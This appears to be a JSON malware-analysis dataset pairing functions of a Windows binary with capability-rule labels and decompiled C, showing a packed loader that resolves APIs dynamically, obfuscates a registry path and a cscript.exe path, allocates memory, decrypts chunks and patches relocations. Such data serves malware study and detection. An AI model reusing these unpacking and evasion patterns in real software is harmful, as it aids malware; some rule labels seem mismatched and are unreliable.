{
    "00401048": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00401048(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_14h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(0);\n    if (*(unaff_EBP + -0x14) == 0) {\n        uVar1 = 0;\n    }\n    else {\n        *0x423be8 = *(unaff_EBP + -0x1c) + -0x29;\n    }\n    return uVar1;\n}\n",
        "token_count": 126
    },
    "0040114c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040114c(uint dwSize)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint flAllocationType;\n    uint lpAddress;\n    uint flProtect;\n    uint var_14h;\n    \n    (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n    if (*(unaff_EBP + -0x14) == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)\n                          (0xffffffff, *(unaff_EBP + -0x22c), *(unaff_EBP + 8), *(unaff_EBP + -0x238), \n                           *(unaff_EBP + -0x18));\n    }\n    return uVar1;\n}\n",
        "token_count": 176
    },
    "00401190": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00401190(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_618h;\n    uint32_t var_614h;\n    uint32_t var_60ch;\n    uint lpString2;\n    uint var_5fch;\n    char *var_5f4h;\n    char16_t *var_5f0h;\n    code *var_5ech;\n    uint lpBuffer;\n    code *var_3dch;\n    int32_t var_3d8h;\n    uint var_2b8h;\n    code *var_2b4h;\n    uint var_2a0h;\n    int32_t var_29ch;\n    uint32_t var_298h;\n    uint32_t var_290h;\n    code *var_28ch;\n    int32_t var_284h;\n    uint var_280h;\n    int32_t var_258h;\n    int32_t var_224h;\n    uint var_21ch;\n    \n    *0x423bf0 = &stack0xfffffffc;\n    var_28ch = fcn.00401b70;\n    var_290h = 0;\n    var_2a0h = 0x80000002;\n    var_5f0h = \n    L\"SOFTWARE\\\\Clzsses\\\\CLSID\\\\{083863F1-70DE-11d0-BD40-00A0C911CE86}\\\\Instance\\\\{1643E180-90F5-11CE-97D5-00AA0055595A}\"\n    ;\n    var_5f4h = \"RegOpenKeyExW\";\n    var_2b8h = 0xe1;\n    var_2b4h = _sym.imp.KERNEL32.dll_LoadLibraryW;\n    var_3dch = _sym.imp.KERNEL32.dll_GetProcAddress;\n    var_3d8h = 0;\n    (*_sym.imp.KERNEL32.dll_GetCPInfoExA)(0, 0, &var_3d8h);\n    if ((var_3d8h != 0) && ((*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(&lpBuffer, 0x104),  lpBuffer._2_2_ == 0x3a)) {\n        *0x41d004 = 0x61;\n        uVar2 = (*var_2b4h)(0x41d004, var_5f4h);\n        var_5ech = (*var_3dch)(uVar2);\n        uVar2 = (*var_2b4h)(L\"kernel32\", \"lstrcatW\");\n        *0x423bf4 = (*var_3dch)(uVar2);\n        var_5f0h[0xb] = L'a';\n        iVar4 = 0;\n        iVar3 = (*var_5ech)(0x80000002, var_5f0h, 0, 0x20019, &var_5fch);\n        if (iVar3 != 0) {\n            pcVar1 = swi(0x33);\n            (*pcVar1)();\n        }\n        fcn.00401040();\n        *0x423be0 = fcn.00401180(*0x423be8);\n        *0x423bf8 = fcn.004010b0(*0x423be0);\n        var_298h = *0x423be0;\n        var_284h = 100;\n        var_224h = 0xe;\n        var_258h = 0;\n        var_280h = 1;\n        var_21ch = 0;\n        for (var_290h = 0; var_290h < *0x423be0; var_290h = var_290h + var_284h) {\n            var_29ch = fcn.00401640(var_284h, var_298h);\n            fcn.004019d0(*0x423bf8 + var_290h, *0x423be8 + var_258h, var_29ch);\n            var_258h = var_224h + var_284h + var_258h;\n            var_298h = var_298h - var_29ch;\n        }\n        fcn.004018c0(*0x423bf8, *0x423be0);\n        var_258h = 0;\n        var_60ch = 0;\n        fcn.00401000(*0x423be4, 0, *0x423be0);\n        var_614h = *0x423be0;\n        for (; var_60ch < *0x423be0; var_60ch = var_60ch + var_284h) {\n            iVar3 = fcn.00401640(var_284h, var_614h);\n            fcn.004019d0(*0x423be4 + var_60ch, *0x423be8 + var_258h, iVar3);\n            var_258h = var_224h + var_284h + var_258h;\n            var_614h = var_614h - iVar3;\n        }\n        fcn.004018c0(*0x423be4, *0x423be0);\n        var_28ch = fcn.00401b70;\n        **0x423bf8 = *0x423be4;\n        *0x423bfc = fcn.004010b0(0x19000);\n        *0x423c00 = *0x423bfc + 0x200;\n        fcn.004019d0(*0x423c00, *0x423bf8, 0x17100);\n        *0x423c04 = *0x423bfc + 0x16f90;\n        return *(iVar4 + -0x28c);\n    }\n    return 0;\n}\n",
        "token_count": 1317
    },
    "004016d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004016d0(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    while (*(arg_8h + 4) != 0) {\n        *0x423c10 = arg_8h + 8;\n        *0x423c14 = *(arg_8h + 4);\n        fcn.004017f0();\n        *0x423c18 = arg_8h;\n        arg_8h = fcn.00401680(1, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00401720": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401720(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    if (arg_8h == 1) {\n        arg_8h = *0x423c18;\n    }\n    fcn.00401760(arg_8h, arg_ch, arg_10h);\n    uVar1 = fcn.004010a0(arg_8h);\n    return uVar1;\n}\n",
        "token_count": 107
    },
    "00401768": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00401768(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t unaff_EBP;\n    uint var_8h;\n    uint var_4h;\n    \n    while (*(unaff_EBP + -4) < *0x423c14) {\n        iVar1 = fcn.004015e0(*0x423c10, *(unaff_EBP + -4));\n        if (iVar1 >> 0xc == 3) {\n            uVar2 = fcn.004015e0(*0x423c10, *(unaff_EBP + -4));\n            *(unaff_EBP + -8) = (uVar2 & 0xfff) + 0x907;\n            *(*(unaff_EBP + 0xc) + **(unaff_EBP + 8) + -0x907 + *(unaff_EBP + -8)) =\n                 *(*(unaff_EBP + 0xc) + **(unaff_EBP + 8) + -0x907 + *(unaff_EBP + -8)) + *(unaff_EBP + 0x10);\n        }\n        in_EAX = *(unaff_EBP + -4) + 1;\n        *(unaff_EBP + -4) = in_EAX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 340
    },
    "004019d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004019d0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_214h;\n    int32_t var_210h;\n    uint var_20ch;\n    uint var_208h;\n    \n    (**0x423bec)(&var_208h, 0x104);\n    var_210h = 0;\n    do {\n        if (arg_10h <= var_210h) {\n            if (arg_8h == *0x423c00) {\n                fcn.004016d0(*0x423be4, *0x423bfc, *0x423bfc + -0x400000);\n            }\n            return;\n        }\n        if (var_210h == 0) {\n            str.666st66666cgcript.6xe[0] = L'\\\\';\n            str.666st66666cgcript.6xe[1] = L's';\n            str.666st66666cgcript.6xe[2] = L'y';\n            str.666st66666cgcript.6xe[5] = L'e';\n            str.666st66666cgcript.6xe[6] = L'm';\n            str.666st66666cgcript.6xe[7] = L'3';\n            str.666st66666cgcript.6xe[8] = L'2';\n            str.666st66666cgcript.6xe[9] = L'\\\\';\n            str.666st66666cgcript.6xe[11] = L's';\n            str.666st66666cgcript.6xe[18] = L'e';\n            (**0x423bf4)(&var_208h, L\"666st66666cgcript.6xe\");\n        }\n        *(arg_8h + var_210h) = *(arg_ch + var_210h);\n        if (var_210h == 0) {\n            *0x423c20 = _sym.imp.KERNEL32.dll_CreateFileW;\n            iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(&var_208h, 1, 3, 0, 3, 0x80, 0);\n            if (iVar1 == -1) {\n                return;\n            }\n            if (iVar1 == 0) {\n                return;\n            }\n        }\n        var_210h = var_210h + 1;\n    } while( true );\n}\n",
        "token_count": 556
    },
    "00401854": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid loc.00401854(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    *(unaff_EBP + -4) = 0x3c2;\n    *(unaff_EBP + -4) = 0x3c2;\n    *(unaff_EBP + -4) = 0x3c2;\n    *(unaff_EBP + -4) = 0x3c2;\n    *(unaff_EBP + -4) = 0x3c2;\n    *(unaff_EBP + -4) = 0x3c2;\n    *(unaff_EBP + -4) = 0x3c2;\n    *(unaff_EBP + -4) = 0x3c2;\n    *(unaff_EBP + -4) = 0x3c2;\n    *(unaff_EBP + -4) = 0x3c2;\n    *(unaff_EBP + -4) = 0x3c2;\n    *(unaff_EBP + -4) = 0x3c2;\n    *0x423c14 = *0x423c14 - 8 >> 1;\n    return;\n}\n",
        "token_count": 268
    },
    "00401006": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall loc.00401006(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    \n    return CONCAT44(param_2, in_EAX);\n}\n",
        "token_count": 40
    },
    "00401020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401020(void)\n\n{\n    uint var_4h;\n    \n    *0x423be8 = 0x401b8c;\n    return;\n}\n",
        "token_count": 39
    },
    "00432000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl loc.00432000(int32_t arg_8h)\n\n{\n    uint in_EDX;\n    \n    // [07] -r-x section size 4096 named .ropf\n    return CONCAT44(in_EDX, arg_8h + *(arg_8h + 4));\n}\n",
        "token_count": 66
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0040161e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nunkbyte5 __fastcall loc.0040161e(uint param_1, uchar param_2)\n\n{\n    uint in_EAX;\n    \n    return CONCAT14(param_2, in_EAX);\n}\n",
        "token_count": 43
    },
    "00432083": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl loc.00432083(uint arg_8h, uint arg_ch)\n\n{\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    \n    fcn.00401720(*(unaff_EBP + 8), *(unaff_EBP + 0xc), unaff_retaddr);\n    return;\n}\n",
        "token_count": 72
    },
    "004320a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t loc.004320a0(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    *(unaff_EBP + -4) = 0;\n    while (*(unaff_EBP + -4) < *0x423c14) {\n        iVar1 = fcn.004015e0(*0x423c10, *(unaff_EBP + -4));\n        if (iVar1 >> 0xc == 3) {\n            uVar2 = fcn.004015e0(*0x423c10, *(unaff_EBP + -4));\n            *(unaff_EBP + -8) = (uVar2 & 0xfff) + 0x907;\n            *(*(unaff_EBP + 0xc) + **(unaff_EBP + 8) + -0x907 + *(unaff_EBP + -8)) =\n                 *(*(unaff_EBP + 0xc) + **(unaff_EBP + 8) + -0x907 + *(unaff_EBP + -8)) + *(unaff_EBP + 0x10);\n        }\n        in_EAX = *(unaff_EBP + -4) + 1;\n        *(unaff_EBP + -4) = in_EAX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 315
    },
    "004018c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004018c0(void)\n\n{\n    uchar *puVar1;\n    ulong uVar2;\n    \n    puVar1 = &stack0xfffffffc;\n    while (*(puVar1 + -0x220) < *(puVar1 + 0xc)) {\n        *(puVar1 + -4) = 0x12f1;\n        *(puVar1 + -4) = 0x12f1;\n        *0x423c1c = *(puVar1 + -0x220) + 0x24e7b;\n        *(puVar1 + -4) = 0x12f1;\n        *(puVar1 + -0x228) = *(puVar1 + 8) + *(puVar1 + -0x220);\n        *(puVar1 + -4) = 0x12f1;\n        *(puVar1 + -4) = 0x12f1;\n        **(puVar1 + -0x228) = **(puVar1 + -0x228) + *(puVar1 + -0x220);\n        *(puVar1 + -4) = 0x12f1;\n        *(puVar1 + -0x224) = *(puVar1 + -0x228);\n        *(puVar1 + -4) = *0x423c1c;\n        *(puVar1 + -4) = 0x12f1;\n        *(puVar1 + -4) = **(puVar1 + -0x224);\n        uVar2 = fcn.004016a0(*(puVar1 + -4), *0x423c1c);\n        puVar1 = uVar2 >> 0x20;\n        *(puVar1 + -4) = uVar2;\n        **(puVar1 + -0x224) = *(puVar1 + -4);\n        *(puVar1 + -0x220) = *(puVar1 + -0x220) + 4;\n    }\n    return;\n}\n",
        "token_count": 443
    },
    "004010b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_238h\n\nuint fcn.004010b0(uint param_1)\n\n{\n    uint uVar1;\n    uint var_238h;\n    uint var_230h;\n    uint var_22ch;\n    uint lpBuffer;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    \n    var_18h = 0x40;\n    var_1ch = 0x307c;\n    *0x423bec = _sym.imp.KERNEL32.dll_GetWindowsDirectoryW;\n    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(&lpBuffer, 0x104, 0x3000);\n    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(&lpBuffer, 0x104);\n    if (lpBuffer._2_2_ == 0x3a) {\n        var_14h = 0;\n        (*_sym.imp.KERNEL32.dll_GetCPInfo)(0, &var_14h);\n        if (var_14h == 0) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(0xffffffff, 0, param_1, 0x3000, var_18h);\n        }\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 317
    },
    "00401640": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.00401640(uint32_t param_1, uint32_t param_2)\n\n{\n    if (param_1 < param_2) {\n        param_2 = param_1;\n    }\n    return param_2;\n}\n",
        "token_count": 55
    },
    "00401760": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.00401760(int32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uStack8;\n    \n    uStack8 = 0;\n    while (uStack8 < *0x423c14) {\n        iVar1 = fcn.004015e0(*0x423c10, uStack8);\n        if (iVar1 >> 0xc == 3) {\n            uVar2 = fcn.004015e0(*0x423c10, uStack8);\n            iVar1 = (uVar2 & 0xfff) + 0x907;\n            *(param_2 + *param_1 + -0x907 + iVar1) = *(param_2 + *param_1 + -0x907 + iVar1) + param_3;\n        }\n        in_EAX = uStack8 + 1;\n        uStack8 = in_EAX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 241
    }
}